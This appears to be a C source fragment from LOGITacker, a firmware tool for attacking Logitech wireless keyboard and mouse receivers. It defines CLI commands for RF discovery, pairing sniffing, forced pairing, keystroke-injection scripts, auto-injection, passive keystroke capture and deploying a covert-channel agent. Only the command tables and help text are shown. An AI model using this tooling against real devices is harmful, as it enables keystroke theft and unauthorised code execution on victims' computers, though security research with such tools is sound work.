NRF_CLI_CREATE_STATIC_SUBCMD_SET(m_sub_discover)
{
    NRF_CLI_CMD(run,   NULL, "Enter discover mode.", cmd_discover_run),
    NRF_CLI_SUBCMD_SET_END
};
NRF_CLI_CMD_REGISTER(discover, &m_sub_discover, "discover", cmd_discover);

//pair_sniff_run level 3
NRF_CLI_CREATE_DYNAMIC_CMD(m_sub_pair_device_addresses, dynamic_device_addr_list_ram);

//pair_sniff level 2
NRF_CLI_CREATE_STATIC_SUBCMD_SET(m_sub_pair_sniff)
{
        NRF_CLI_CMD(run, NULL, "Sniff pairing.", cmd_pair_sniff_run),
        NRF_CLI_SUBCMD_SET_END
};

NRF_CLI_CREATE_STATIC_SUBCMD_SET(m_sub_pair_device)
{
        NRF_CLI_CMD(run, &m_sub_pair_device_addresses, "Pair device on given address (if no address given, pairing address is used).", cmd_pair_device_run),
        NRF_CLI_SUBCMD_SET_END
};


NRF_CLI_CREATE_STATIC_SUBCMD_SET(m_sub_pair)
{
    NRF_CLI_CMD(sniff, &m_sub_pair_sniff, "Sniff pairing.", cmd_help),
    NRF_CLI_CMD(device, &m_sub_pair_device, "pair or forced pair a device to a dongle", NULL),
    NRF_CLI_SUBCMD_SET_END
};
NRF_CLI_CMD_REGISTER(pair, &m_sub_pair, "discover", cmd_pair);

//LEVEL 3
NRF_CLI_CREATE_DYNAMIC_CMD(m_sub_dynamic_script_name, dynamic_script_name);

NRF_CLI_CREATE_STATIC_SUBCMD_SET(m_sub_script)
{
        NRF_CLI_CMD(clear,   NULL, "clear current script (injection tasks)", cmd_script_clear),
        NRF_CLI_CMD(undo,   NULL, "delete last command from script (last injection task)", cmd_script_undo),
        NRF_CLI_CMD(show,   NULL, "show listing of current script", cmd_script_show),
        NRF_CLI_CMD(string,   NULL, "append 'string' command to script, which types out the text given as parameter", cmd_script_string),
        NRF_CLI_CMD(altstring,   NULL, "append 'altstring' command to script, which types out the text using NUMPAD", cmd_script_altstring),
        NRF_CLI_CMD(press,   NULL, "append 'press' command to script, which creates a key combination from the given parameters", cmd_script_press),
        NRF_CLI_CMD(delay,   NULL, "append 'delay' command to script, delays script execution by the amount of milliseconds given as parameter", cmd_script_delay),
        NRF_CLI_CMD(store,   NULL, "store script to flash", cmd_script_store),
        NRF_CLI_CMD(load,   &m_sub_dynamic_script_name, "load script from flash", cmd_script_load),
        NRF_CLI_CMD(list,   NULL, "list scripts stored on flash", cmd_script_list),
        NRF_CLI_CMD(remove,   &m_sub_dynamic_script_name, "delete script from flash", cmd_script_remove),
        NRF_CLI_SUBCMD_SET_END
};
NRF_CLI_CMD_REGISTER(script, &m_sub_script, "scripting for injection", cmd_inject);

//level 2
NRF_CLI_CREATE_DYNAMIC_CMD(m_sub_inject_target_addr, dynamic_device_addr_list_ram_with_usb);

// level 1
NRF_CLI_CREATE_STATIC_SUBCMD_SET(m_sub_inject)
{
    NRF_CLI_CMD(target, &m_sub_inject_target_addr, "enter injection mode for given target RF address", cmd_inject_target),
    NRF_CLI_CMD(execute,   NULL, "run current script against injection target", cmd_inject_execute),
    NRF_CLI_SUBCMD_SET_END
};
NRF_CLI_CMD_REGISTER(inject, &m_sub_inject, "injection", cmd_inject);

//device level 3
NRF_CLI_CREATE_DYNAMIC_CMD(m_sub_device_storage_load_list, dynamic_device_addr_list_stored);
//NRF_CLI_CREATE_DYNAMIC_CMD(m_sub_device_store_delete_list, dynamic_device_addr_list_stored_with_all);
NRF_CLI_CREATE_DYNAMIC_CMD(m_sub_device_store_delete_list, dynamic_device_addr_list_stored); // don't offer delete all option for flash
NRF_CLI_CREATE_DYNAMIC_CMD(m_sub_device_store_save_list, dynamic_device_addr_list_ram);
//device level 2
NRF_CLI_CREATE_STATIC_SUBCMD_SET(m_sub_devices_storage)
{
    NRF_CLI_CMD(list, NULL, "list devices stored on flash", cmd_devices_storage_list),
    NRF_CLI_CMD(load, &m_sub_device_storage_load_list, "load a stored device", cmd_devices_storage_load),
    NRF_CLI_CMD(save, &m_sub_device_store_save_list, "store a device to flash", cmd_devices_storage_save),
    NRF_CLI_CMD(remove, &m_sub_device_store_delete_list, "delete a stored device from flash", cmd_devices_storage_remove),
    NRF_CLI_SUBCMD_SET_END
};

NRF_CLI_CREATE_DYNAMIC_CMD(m_sub_devices_remove_addr_collection, dynamic_device_addr_list_ram_with_all);
//devices level 1 (handles auto-complete from level 2 as parameter)
NRF_CLI_CREATE_STATIC_SUBCMD_SET(m_sub_devices)
{
        NRF_CLI_CMD(storage, &m_sub_devices_storage, "handle devices on flash", NULL),
        NRF_CLI_CMD(remove, &m_sub_devices_remove_addr_collection, "delete a device from list (RAM)", cmd_devices_remove),
        NRF_CLI_CMD(add, NULL, "manually add a device (RAM)", cmd_devices_add),
        NRF_CLI_SUBCMD_SET_END
};
NRF_CLI_CMD_REGISTER(devices, &m_sub_devices, "List discovered devices", cmd_devices);

NRF_CLI_CREATE_DYNAMIC_CMD(m_sub_enum_device_list, dynamic_device_addr_list_ram);

NRF_CLI_CREATE_STATIC_SUBCMD_SET(m_sub_covertchannel)
{
        NRF_CLI_CMD(connnect, &m_sub_enum_device_list, "connect to device with deployed covert channel", cmd_covert_channel_connect),
        NRF_CLI_CMD(deploy, &m_sub_enum_device_list, "deploy covert channel agent for given device", cmd_covert_channel_deploy),
        NRF_CLI_SUBCMD_SET_END
};

NRF_CLI_CMD_REGISTER(covert_channel, &m_sub_covertchannel, "start covert channel for given device", NULL);


NRF_CLI_CMD_REGISTER(active_enum, &m_sub_enum_device_list, "start active enumeration of given device", cmd_enum_active);
NRF_CLI_CMD_REGISTER(passive_enum, &m_sub_enum_device_list, "start passive enumeration of given device", cmd_enum_passive);

#ifdef CLI_TEST_COMMANDS
NRF_CLI_CMD_REGISTER(prx, &m_sub_enum_device_list, "start a PRX for the given device address", cmd_prx);
#endif

NRF_CLI_CMD_REGISTER(erase_flash, NULL, "erase all data stored on flash", cmd_erase_flash);

NRF_CLI_CMD_REGISTER(version, NULL, "print version string", cmd_version);

//options

NRF_CLI_CREATE_STATIC_SUBCMD_SET(m_sub_options_on_off)
{
    NRF_CLI_CMD(on, NULL, "enable", NULL),
    NRF_CLI_CMD(off, NULL, "disable", NULL),
    NRF_CLI_SUBCMD_SET_END
};

NRF_CLI_CREATE_STATIC_SUBCMD_SET(m_sub_options_inject_defaultscript)
{
    NRF_CLI_CMD(clear, NULL, "clear default script", cmd_options_inject_defaultscript_clear),
    NRF_CLI_SUBCMD_SET_END
};

// options passive-enum
NRF_CLI_CREATE_STATIC_SUBCMD_SET(m_sub_options_passiveenum)
{
    NRF_CLI_CMD(pass-through-keyboard, &m_sub_options_on_off, "pass received keyboard reports to LOGITacker's USB keyboard interface", cmd_options_passiveenum_pass_keyboard),
    NRF_CLI_CMD(pass-through-mouse, &m_sub_options_on_off, "pass received mouse reports to LOGITacker's USB mouse interface", cmd_options_passiveenum_pass_mouse),
    NRF_CLI_CMD(pass-through-raw, &m_sub_options_on_off, "pass all received RF reports to LOGITacker's USB hidraw interface", cmd_options_passiveenum_pass_raw),
    NRF_CLI_SUBCMD_SET_END
};

// options discover onhit
NRF_CLI_CREATE_STATIC_SUBCMD_SET(m_sub_options_discover_onhit)
{
    NRF_CLI_CMD(continue,   NULL, "stay in discover mode.", cmd_discover_onhit_continue),
    NRF_CLI_CMD(active-enum, NULL, "enter active enumeration mode", cmd_discover_onhit_activeenum),
    NRF_CLI_CMD(passive-enum, NULL, "enter passive enumeration mode", cmd_discover_onhit_passiveenum),
    NRF_CLI_CMD(auto-inject, NULL, "enter injection mode and execute injection", cmd_discover_onhit_autoinject),
    NRF_CLI_SUBCMD_SET_END
};

// options discover
NRF_CLI_CREATE_STATIC_SUBCMD_SET(m_sub_options_discover)
{
    NRF_CLI_CMD(pass-through-raw, &m_sub_options_on_off, "pass all received promiscuous RF reports to LOGITacker's USB hidraw interface", cmd_options_discover_pass_raw),
    NRF_CLI_CMD(onhit, &m_sub_options_discover_onhit, "select action to take when device a RF address is discovered", cmd_help),
    NRF_CLI_CMD(auto-store-plain-injectable, &m_sub_options_on_off, "automatically store discovered devices to flash if they allow plain injection", cmd_options_discover_autostoreplain),
    NRF_CLI_SUBCMD_SET_END
};

//options pair-sniff onsuccess
NRF_CLI_CREATE_STATIC_SUBCMD_SET(m_sub_options_pairsniff_onsuccess)
{
        NRF_CLI_CMD(continue, NULL, "continue to sniff pairing attempts", cmd_pair_sniff_onsuccess_continue),
        NRF_CLI_CMD(passive-enum, NULL, "start passive enumeration of newly paired device", cmd_pair_sniff_onsuccess_passiveenum),
        NRF_CLI_CMD(active-enum, NULL, "start passive enumeration of newly paired device", cmd_pair_sniff_onsuccess_activeenum),
        NRF_CLI_CMD(discover, NULL, "enter discover mode", cmd_pair_sniff_onsuccess_discover),
        NRF_CLI_CMD(auto-inject, NULL, "enter injection mode and execute injection", cmd_pair_sniff_onsuccess_autoinject),

        NRF_CLI_SUBCMD_SET_END
};


// options pair-sniff
NRF_CLI_CREATE_STATIC_SUBCMD_SET(m_sub_options_pairsniff)
{
    // ToDo: raw pass-through for pair sniff
    //NRF_CLI_CMD(pass-through-raw, &m_sub_options_on_off, "pass all pairing RF reports to LOGITacker's USB hidraw interface (not implemented)", NULL),
    NRF_CLI_CMD(pass-through-raw, NULL, "pass all pairing RF reports to LOGITacker's USB hidraw interface (not implemented)", NULL),
    NRF_CLI_CMD(onsuccess, &m_sub_options_pairsniff_onsuccess, "select action after a successful pairing has been captured", cmd_help),
    NRF_CLI_CMD(auto-store-pair-sniffed-devices, &m_sub_options_on_off, "automatically store devices after pairing has been sniffed successfully", cmd_options_pairsniff_autostoredevice),
    NRF_CLI_SUBCMD_SET_END
};

// options inject onsuccess
NRF_CLI_CREATE_STATIC_SUBCMD_SET(m_sub_options_inject_onsuccess)
{
    NRF_CLI_CMD(continue,   NULL, "stay in inject mode.", cmd_inject_onsuccess_continue),
    NRF_CLI_CMD(active-enum, NULL, "enter active enumeration", cmd_inject_onsuccess_activeenum),
    NRF_CLI_CMD(passive-enum, NULL, "enter passive enumeration", cmd_inject_onsuccess_passiveenum),
    NRF_CLI_CMD(discover, NULL, "enter discover mode", cmd_inject_onsuccess_discover),
    NRF_CLI_SUBCMD_SET_END
};
// options inject onfail
NRF_CLI_CREATE_STATIC_SUBCMD_SET(m_sub_options_inject_onfail)
{
    NRF_CLI_CMD(continue,   NULL, "stay in inject mode.", cmd_inject_onfail_continue),
    NRF_CLI_CMD(active-enum, NULL, "enter active enumeration", cmd_inject_onfail_activeenum),
    NRF_CLI_CMD(passive-enum, NULL, "enter passive enumeration", cmd_inject_onfail_passiveenum),
    NRF_CLI_CMD(discover, NULL, "enter discover mode", cmd_inject_onfail_discover),
    NRF_CLI_SUBCMD_SET_END
};

// options inject
NRF_CLI_CREATE_STATIC_SUBCMD_SET(m_sub_options_inject)
{
    NRF_CLI_CMD(language, NULL, "set injection keyboard language layout", cmd_options_inject_lang),

    NRF_CLI_CMD(default-script, &m_sub_options_inject_defaultscript, "name of inject script which is loaded at boot", cmd_options_inject_defaultscript),
    NRF_CLI_CMD(clear-default-script, NULL, "clear script which should be loaded at boot", cmd_options_inject_defaultscript_clear),
    NRF_CLI_CMD(auto-inject-count,   NULL, "maximum number of auto-injects per device", cmd_options_inject_maxautoinjectsperdevice),

    NRF_CLI_CMD(onsuccess, &m_sub_options_inject_onsuccess, "action after successful injection", cmd_help),
    NRF_CLI_CMD(onfail, &m_sub_options_inject_onfail, "action after failed injection", cmd_help),


    NRF_CLI_SUBCMD_SET_END
};


// options global workmode
NRF_CLI_CREATE_STATIC_SUBCMD_SET(m_sub_options_global_workmode)
{
    NRF_CLI_CMD(unifying,   NULL, "Unifying compatible workmode.", cmd_option_global_workmode_unifying),
    NRF_CLI_CMD(lightspeed,   NULL, "G-Series LIGHTSPEED workmode.", cmd_option_global_workmode_lightspeed),
    NRF_CLI_CMD(g700,   NULL, "G700/G700s receiver workmode.", cmd_option_global_workmode_g700),
    NRF_CLI_SUBCMD_SET_END
};

// options global usbinjectmode
NRF_CLI_CREATE_STATIC_SUBCMD_SET(m_sub_options_global_usbinjectmode)
{
    NRF_CLI_CMD(powerup,   NULL, "Start USB injection when device is powered on (not accurate, but on every OS).", cmd_option_global_usbinjecttrigger_onpowerup),
    NRF_CLI_CMD(ledupdate,   NULL, "Start USB injection when device receives a keyboard LED report (accurate, not on every OS) ", cmd_option_global_usbinjecttrigger_onledupdate),
    NRF_CLI_SUBCMD_SET_END
};

// options global workmode
NRF_CLI_CREATE_STATIC_SUBCMD_SET(m_sub_options_global_bootmode)
{
    NRF_CLI_CMD(discover,   NULL, "Boot in 'discover' mode.", cmd_option_global_bootmode_discover),
    NRF_CLI_CMD(usbinject,   NULL, "Boot in 'USB key stroke injection' mode.", cmd_option_global_bootmode_usbinject),
    NRF_CLI_SUBCMD_SET_END
};

// options global
NRF_CLI_CREATE_STATIC_SUBCMD_SET(m_sub_options_global)
{
    NRF_CLI_CMD(workmode, &m_sub_options_global_workmode, "LOGITacker working mode", cmd_help),
    NRF_CLI_CMD(bootmode, &m_sub_options_global_bootmode, "LOGITacker boot mode", cmd_help),
    NRF_CLI_CMD(usbtrigger, &m_sub_options_global_usbinjectmode, "When to trigger USB injection", cmd_help),

    NRF_CLI_SUBCMD_SET_END
};

// options
NRF_CLI_CREATE_STATIC_SUBCMD_SET(m_sub_options)
{
    NRF_CLI_CMD(show, NULL, "print current options", cmd_options_show),
    NRF_CLI_CMD(store,   NULL, "store current options to flash (persist reboot)", cmd_options_store),
    NRF_CLI_CMD(erase,   NULL, "erase options from flash (defaults after reboot)", cmd_options_erase),

    NRF_CLI_CMD(passive-enum, &m_sub_options_passiveenum, "options for passive-enum mode", cmd_help),

    NRF_CLI_CMD(discover, &m_sub_options_discover, "options for discover mode", cmd_help),

    NRF_CLI_CMD(pair-sniff, &m_sub_options_pairsniff, "options for pair sniff mode", cmd_help),

    NRF_CLI_CMD(inject, &m_sub_options_inject, "options for inject mode", cmd_help),

    NRF_CLI_CMD(global, &m_sub_options_global, "global options", cmd_help),


    //NRF_CLI_CMD(pass-keyboard,   NULL, "pass-through keystrokes to USB keyboard", cmd_options_passiveenum_pass_keyboard),
    //NRF_CLI_CMD(pass-mouse,   NULL, "pass-through mouse moves to USB mouse", cmd_options_passiveenum_pass_mouse),

    NRF_CLI_SUBCMD_SET_END
};
NRF_CLI_CMD_REGISTER(options, &m_sub_options, "options", cmd_help);
